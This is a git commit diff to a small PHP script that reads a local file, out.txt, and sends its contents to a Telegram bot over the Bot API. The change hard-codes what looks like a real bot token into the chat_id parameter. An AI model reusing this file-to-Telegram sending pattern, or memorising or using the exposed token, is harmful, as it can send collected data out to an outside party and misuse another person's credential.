d25bb52c1c6cc8d45a9b93b65a7cb7f35502e535
sha2waker <51480597+sha2waker@users.noreply.github.com>
2020-04-08 00:27:54 +0430

    Update send.php

--- send.php
+++ send.php
@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=1164820129:AAFHFtmTEUTDH5ikygpz2XZey4NywdScJGo&text=$msg");
 ?>
